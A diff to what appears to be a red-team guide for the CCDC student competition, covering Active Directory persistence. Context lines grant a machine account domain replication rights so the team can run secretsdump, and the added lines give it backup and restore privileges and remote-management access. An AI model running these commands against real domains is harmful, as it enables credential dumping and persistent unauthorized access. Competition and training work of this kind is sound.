@@ -178,6 +178,10 @@ pagetitle: Red Teaming for CCDC
 - Then give it permissions over the domain (so we can secretsdump)
   - `dsacls 'DC={domain},DC={tld}' /I:T /G '{domain}\{machine_account}:CA;Replicating Directory Changes'`
   - `dsacls 'DC={domain},DC={tld}' /I:T /G '{domain}\{machine_account}:CA;Replicating Directory Changes All'`
+- Should also give it `SeBackupPrivilege` and `SeRestorePrivilege` 
+  - Will need remoting privileges, so add to `remote management users` with `net localgroup 'remote management users' /add {machine_account}`
+  - Can use [this handy script](https://github.com/blakedrumm/SCOM-Scripts-and-SQL/blob/master/Powershell/General%20Functions/Set-UserRights.ps1)
+    - `.\Set-UserRights.ps1 -AddRight -Username {domain}\{machine_account} -UserRight SeBackupPrivilege,SeRestorePrivilege`
 		
 **Shadow Copies**
 - Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots
